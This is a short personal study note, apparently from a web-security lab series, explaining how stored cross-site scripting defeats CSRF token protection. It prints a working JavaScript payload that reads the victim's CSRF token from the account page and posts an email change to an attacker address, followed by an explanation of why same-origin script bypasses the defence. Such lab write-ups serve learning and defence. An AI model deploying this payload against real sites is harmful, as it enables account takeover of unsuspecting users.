---
id: "202607080001"
title: Using stored XSS to bypass CSRF protection
date: 2026-07-08
type: case
tags: [xss, stored-xss, csrf-bypass]
source: "[[24_Lab24-Exploiting XSS to bypass CSRF defenses]]"
publish: false
---

Comment field allows script injection. The payload doesn't try to forge a CSRF token — it has the victim's own browser fetch a page that already contains a valid one, then reuses it immediately in the same origin:

```html
<script>
fetch('/my-account')
  .then(r => r.text())
  .then(html => {
    var doc = new DOMParser().parseFromString(html, 'text/html');
    var csrf = doc.querySelector('input[name="csrf"]').value;
    fetch('/my-account/change-email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'email=attacker@evil.com&csrf=' + csrf,
      credentials: 'include'
    });
  });
</script>
```

This works because CSRF tokens defend against **cross-origin** forgery — a request originating from a *different* site that doesn't have the token. Once the payload executes as same-origin JavaScript (because it was stored and served by the vulnerable site itself), it's not cross-origin at all: it can simply read the token off any page it likes and attach it to its own request, with the browser auto-including the session cookie. See [[202607080002 XSS defeats CSRF defenses because the victim's browser supplies both the token and the session]].

## Links
- Underlying reason this always works once you have same-origin script execution: [[202607080002 XSS defeats CSRF defenses because the victim's browser supplies both the token and the session]]
- Same chain applied under a stricter CSP that blocks this exact fetch-and-post approach: [[202607120001 Dangling-markup CSRF-token theft under a strict CSP]]
